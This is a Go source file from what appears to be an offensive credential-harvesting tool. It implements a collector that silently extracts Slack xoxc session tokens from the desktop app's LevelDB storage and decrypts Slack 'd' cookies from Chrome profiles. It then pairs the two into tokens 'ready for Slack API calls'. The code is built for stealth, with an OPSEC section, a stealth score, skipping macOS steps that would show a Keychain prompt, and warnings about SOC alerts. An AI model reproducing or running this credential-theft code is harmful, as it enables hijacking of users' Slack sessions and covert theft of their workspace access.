// Slack combined collector — correlates xoxc tokens with d cookies.
//
// The Slack API requires BOTH an xoxc token (from the desktop app's LevelDB)
// AND the browser d cookie for authentication. This collector runs both
// extraction pipelines and produces correlated tokens ready for API use.
//
// OPSEC:
//   - Windows/Linux: SILENT (desktop LevelDB read + DPAPI/'peanuts' cookie decrypt)
//   - macOS: xoxc extraction is silent, but d cookie extraction is SKIPPED
//     (Keychain prompt would be user-visible). Returns xoxc-only with a warning.
//
// No build tag — runs on all platforms. On macOS/platforms without
// browser_cookies, it still works with desktop tokens only (no d cookies).
package slack

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"

	"github.com/ninken/ninloader-go/internal/chromium"
	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

// Slack team IDs: uppercase T followed by 8-11 alphanumeric chars.
var teamIDRe = regexp.MustCompile(`T[A-Z0-9]{8,11}`)

// Context window (bytes before a token match) to scan for team ID.
const contextWindow = 512

func init() {
	registry.Register("slack", "combined", func() collector.Collector {
		return &CombinedCollector{
			BaseCollector: collector.BaseCollector{Svc: "slack", Src: "combined"},
		}
	})
}

// CombinedCollector correlates xoxc tokens from the Slack desktop app with
// d cookies from the Chrome browser to produce combined tokens ready for
// Slack API calls.
type CombinedCollector struct {
	collector.BaseCollector
}

func (c *CombinedCollector) Service() string          { return c.Svc }
func (c *CombinedCollector) Source() string            { return c.Src }
func (c *CombinedCollector) StealthScore() int         { return 5 }
func (c *CombinedCollector) Platforms() []string       { return nil } // all platforms
func (c *CombinedCollector) IsPlatformSupported() bool { return true }

// ── internal helpers (inlined from desktop + browser_cookies) ──

// findStorageDirs returns Slack desktop LevelDB directories.
func (c *CombinedCollector) findStorageDirs() []string {
	var dirs []string
	base := platform.SlackDataDir()

	lsDir := filepath.Join(base, "Local Storage", "leveldb")
	if info, err := os.Stat(lsDir); err == nil && info.IsDir() {
		dirs = append(dirs, lsDir)
	}

	storageDir := filepath.Join(base, "storage")
	if info, err := os.Stat(storageDir); err == nil && info.IsDir() {
		dirs = append(dirs, storageDir)
	}

	return dirs
}

// hasXoxcTokens does a quick scan to see if xoxc tokens exist in desktop LevelDB.
func (c *CombinedCollector) hasXoxcTokens() bool {
	for _, lsDir := range c.findStorageDirs() {
		entries, err := os.ReadDir(lsDir)
		if err != nil {
			continue
		}
		for _, entry := range entries {
			if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".log") {
				continue
			}
			raw, err := os.ReadFile(filepath.Join(lsDir, entry.Name()))
			if err != nil {
				continue
			}
			text := strings.ToValidUTF8(string(raw), "\uFFFD")
			if strings.Contains(text, "xoxc-") {
				return true
			}
		}
	}
	return false
}

// hasDCookieSources checks if there's a Chrome Cookies DB that might have d cookies.
func (c *CombinedCollector) hasDCookieSources() bool {
	if runtime.GOOS == "darwin" {
		return false // Keychain prompt — skip on macOS
	}
	chromeDir := platform.ChromeUserDataDir()
	for _, profile := range combinedProfiles() {
		cookiesDB := filepath.Join(chromeDir, profile, "Cookies")
		if fileExists(cookiesDB) {
			return true
		}
		cookiesDB = filepath.Join(chromeDir, profile, "Network", "Cookies")
		if fileExists(cookiesDB) {
			return true
		}
	}
	return false
}

// extractTeamFromContext extracts a Slack team ID from the LevelDB context near a token.
// Slack desktop stores xoxc tokens in LevelDB with key prefixes like
// https://app.slack.com_T01234ABCD. We look backward from the token position
// for a team ID pattern.
func extractTeamFromContext(text string, matchStart int) string {
	windowStart := matchStart - contextWindow
	if windowStart < 0 {
		windowStart = 0
	}
	context := text[windowStart:matchStart]

	// Prefer team ID that appears in a Slack origin URL.
	originRe := regexp.MustCompile(`https?://[^\s]*?slack\.com[^\s]*?(T[A-Z0-9]{8,11})`)
	if m := originRe.FindStringSubmatch(context); len(m) > 1 {
		return m[1]
	}

	// Fallback: any bare team ID in the context window (last match wins
	// because it's closest to the token).
	matches := teamIDRe.FindAllString(context, -1)
	if len(matches) > 0 {
		return matches[len(matches)-1]
	}

	return ""
}

// xoxcTokenPair holds a token value with its optional team ID.
type xoxcTokenPair struct {
	Token  string
	TeamID string
}

// extractXoxcTokens extracts unique xoxc tokens with optional team IDs from LevelDB.
func (c *CombinedCollector) extractXoxcTokens() []xoxcTokenPair {
	xoxcRe := regexp.MustCompile(`(xoxc-[A-Za-z0-9-]+)`)

	var tokens []xoxcTokenPair
	for _, lsDir := range c.findStorageDirs() {
		entries, err := os.ReadDir(lsDir)
		if err != nil {
			continue
		}
		for _, entry := range entries {
			if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".log") {
				continue
			}
			raw, err := os.ReadFile(filepath.Join(lsDir, entry.Name()))
			if err != nil {
				continue
			}
			text := strings.ToValidUTF8(string(raw), "\uFFFD")

			for _, loc := range xoxcRe.FindAllStringIndex(text, -1) {
				tokenVal := text[loc[0]:loc[1]]
				if len(tokenVal) <= 20 {
					continue
				}
				teamID := extractTeamFromContext(text, loc[0])
				tokens = append(tokens, xoxcTokenPair{Token: tokenVal, TeamID: teamID})
			}
		}
	}

	// Deduplicate by token value, preserving order. If the same token
	// appears multiple times with different team_id guesses, prefer the
	// first non-empty team_id.
	seen := make(map[string]int) // token -> index in unique
	var unique []xoxcTokenPair
	for _, pair := range tokens {
		if idx, exists := seen[pair.Token]; !exists {
			seen[pair.Token] = len(unique)
			unique = append(unique, pair)
		} else if pair.TeamID != "" && unique[idx].TeamID == "" {
			// Upgrade: replace empty with a real team_id.
			unique[idx] = pair
		}
	}

	return unique
}

// dCookieResult holds a d cookie value with its profile and metadata.
type dCookieResult struct {
	Value   string
	Host    string
	Path    string
	Secure  bool
	HTTP    bool
	Profile string
}

// extractDCookies extracts Slack d cookies from Chrome. Returns nil on macOS or failure.
func (c *CombinedCollector) extractDCookies() []dCookieResult {
	if runtime.GOOS == "darwin" {
		return nil
	}

	chromeDir := platform.ChromeUserDataDir()
	var results []dCookieResult

	for _, profile := range combinedProfiles() {
		cookies, err := chromium.ExtractCookies(chromeDir, profile, []string{".slack.com"}, nil)
		if err != nil {
			c.Warn(fmt.Sprintf("Failed to extract cookies from %s: %v", profile, err))
			continue
		}

		for _, ck := range cookies {
			if ck.Name == "d" {
				results = append(results, dCookieResult{
					Value:   ck.Value,
					Host:    ck.Host,
					Path:    ck.Path,
					Secure:  ck.Secure,
					HTTP:    ck.HTTPOnly,
					Profile: profile,
				})
			}
		}
	}

	return results
}

// extractTeamFromXoxc determines team ID for an xoxc token.
// Uses the context team ID extracted during LevelDB parsing. As a secondary
// heuristic, some xoxc tokens embed a team ID segment.
func extractTeamFromXoxc(token string, contextTeamID string) string {
	if contextTeamID != "" {
		return contextTeamID
	}

	// Heuristic: some xoxc tokens contain a team-id-like segment after
	// the initial prefix, e.g. xoxc-<id>-<id>-<TEAM_ID>-<rest>.
	segments := strings.Split(token, "-")
	for _, seg := range segments[1:] {
		if teamIDRe.MatchString(seg) && len(seg) == len(teamIDRe.FindString(seg)) {
			return seg
		}
	}

	return ""
}

// ── public interface ──

func (c *CombinedCollector) Discover() []*types.DiscoveredToken {
	hasXoxc := c.hasXoxcTokens()
	hasD := c.hasDCookieSources()

	if !hasXoxc && !hasD {
		return nil
	}

	var parts []string
	if hasXoxc {
		parts = append(parts, "xoxc from desktop")
	}
	if hasD {
		parts = append(parts, "d cookie from browser")
	}

	coverage := strings.Join(parts, " + ")
	status := "partial"
	if hasXoxc && hasD {
		status = "BOTH available"
	}

	return []*types.DiscoveredToken{
		{
			Service:      c.Svc,
			Source:       c.Src,
			StealthScore: c.StealthScore(),
			Details:      fmt.Sprintf("combined: %s (%s)", coverage, status),
		},
	}
}

func (c *CombinedCollector) Collect() []*types.CollectedToken {
	xoxcPairs := c.extractXoxcTokens()
	dCookies := c.extractDCookies()

	var results []*types.CollectedToken

	if len(xoxcPairs) > 0 && len(dCookies) > 0 {
		// Default d_cookie: first available.
		defaultDValue := dCookies[0].Value
		defaultDProfile := dCookies[0].Profile
		if defaultDProfile == "" {
			defaultDProfile = "unknown"
		}

		matchedCount := 0
		var teamIDs []string

		for _, pair := range xoxcPairs {
			resolvedTeam := extractTeamFromXoxc(pair.Token, pair.TeamID)

			if resolvedTeam != "" {
				matchedCount++
				if !containsStr(teamIDs, resolvedTeam) {
					teamIDs = append(teamIDs, resolvedTeam)
				}
			}

			tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
			tok.AccessToken = types.Secure(pair.Token)
			if resolvedTeam != "" {
				tok.TenantID = resolvedTeam
			}
			tok.Extra["d_cookie"] = defaultDValue
			tok.Extra["token_type"] = "xoxc+d_cookie"
			tok.Extra["d_cookie_profile"] = defaultDProfile
			tok.Extra["note"] = "Combined xoxc + d cookie — ready for Slack API calls. WARNING: browser token usage may trigger SOC alerts."
			if resolvedTeam != "" {
				tok.Extra["team_id"] = resolvedTeam
			}

			results = append(results, tok)
		}

		// Log correlation summary.
		fallbackCount := len(xoxcPairs) - matchedCount
		teamSummary := ""
		if len(teamIDs) > 0 {
			teamSummary = fmt.Sprintf(" teams=%s", strings.Join(teamIDs, ","))
		}
		c.Info(fmt.Sprintf(
			"Correlated %d xoxc token(s) with d cookie from chrome:%s (team-matched=%d, fallback=%d%s)",
			len(xoxcPairs), defaultDProfile, matchedCount, fallbackCount, teamSummary,
		))

	} else if len(xoxcPairs) > 0 && len(dCookies) == 0 {
		// xoxc only — warn about missing d_cookie.
		reason := "Chrome d cookie extraction failed or not available"
		if runtime.GOOS == "darwin" {
			reason = "macOS Keychain prompt would be visible"
		}

		for _, pair := range xoxcPairs {
			resolvedTeam := extractTeamFromXoxc(pair.Token, pair.TeamID)

			tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
			tok.AccessToken = types.Secure(pair.Token)
			if resolvedTeam != "" {
				tok.TenantID = resolvedTeam
			}
			tok.Extra["token_type"] = "xoxc"
			tok.Extra["note"] = fmt.Sprintf(
				"xoxc token only — d cookie NOT available (%s). Slack API calls will FAIL without the d cookie.",
				reason,
			)
			if resolvedTeam != "" {
				tok.Extra["team_id"] = resolvedTeam
			}

			results = append(results, tok)
		}

		c.Warn(fmt.Sprintf(
			"Found %d xoxc token(s) but NO d cookie (%s). API calls will fail without d cookie.",
			len(xoxcPairs), reason,
		))

	} else if len(dCookies) > 0 && len(xoxcPairs) == 0 {
		// d_cookie only — return with a note.
		for _, d := range dCookies {
			profile := d.Profile
			if profile == "" {
				profile = "unknown"
			}

			tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
			tok.AccessToken = types.Secure(d.Value)
			tok.Extra["token_type"] = "d_cookie_only"
			tok.Extra["cookie_name"] = "d"
			tok.Extra["host"] = d.Host
			tok.Extra["profile"] = profile
			tok.Extra["note"] = "d cookie only — no xoxc token found in Slack desktop app. Cannot make API calls without the xoxc token."

			results = append(results, tok)
		}

		c.Warn(fmt.Sprintf(
			"Found %d d cookie(s) but NO xoxc token. Slack desktop app may not be installed.",
			len(dCookies),
		))
	}

	return results
}

// ── helpers ──

func combinedProfiles() []string {
	p := []string{"Default"}
	for i := 1; i <= 9; i++ {
		p = append(p, fmt.Sprintf("Profile %d", i))
	}
	return p
}

func containsStr(slice []string, s string) bool {
	for _, v := range slice {
		if v == s {
			return true
		}
	}
	return false
}

func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && !info.IsDir()
}
